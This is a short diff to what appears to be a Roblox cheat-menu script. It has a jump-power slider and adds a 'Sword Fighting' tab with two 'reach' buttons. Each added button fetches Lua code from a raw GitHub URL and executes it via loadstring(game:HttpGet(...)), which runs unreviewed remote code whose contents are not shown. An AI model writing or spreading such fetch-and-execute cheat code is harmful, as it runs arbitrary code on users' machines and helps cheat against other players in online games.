@@ -23,3 +23,9 @@ end)
 Tab:NewValueSelection("Jumppower",16,1000,5,50,function(s)
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
 end)
+
+local Tab2 = Window:NewTab("Sword Fighting",false)
+
+Tab2:NewButton("Woot Reach",function() loadstring(game:HttpGet(('https://raw.githubusercontent.com/CJFabro8/test/main/uhhh'),true))() end, false)
+
+Tab2:NewButton("Best reach",function() loadstring(game:HttpGet(('https://raw.githubusercontent.com/CJFabro8/test/main/best%20reach%20idk%3F'),true))() end, false)
